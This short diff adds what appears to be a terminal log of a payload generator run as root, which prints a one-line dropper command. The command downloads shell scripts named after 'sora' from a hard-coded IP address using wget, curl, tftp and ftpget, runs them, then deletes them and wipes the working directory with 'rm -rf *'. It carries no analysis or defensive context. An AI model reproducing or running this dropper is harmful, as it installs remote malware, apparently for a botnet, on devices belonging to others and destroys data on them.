@@ -1,0 +1,6 @@
+[root@bleed ~]# python payload.py
+Please wait while your payload generating.
+ 
+Creating .sh Bins
+ 
+Payload: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://164.90.171.162/sora.sh; curl -O http://164.90.171.162/sora.sh; chmod 777 sora.sh; sh sora.sh; tftp 164.90.171.162 -c get sora.sh; chmod 777 sora.sh; sh sora.sh; tftp -r sora2.sh -g 164.90.171.162; chmod 777 sora2.sh; sh sora2.sh; ftpget -v -u anonymous -p anonymous -P 21 164.90.171.162 sora1.sh sora1.sh; sh sora1.sh; rm -rf sora.sh sora.sh sora2.sh sora1.sh; rm -rf *
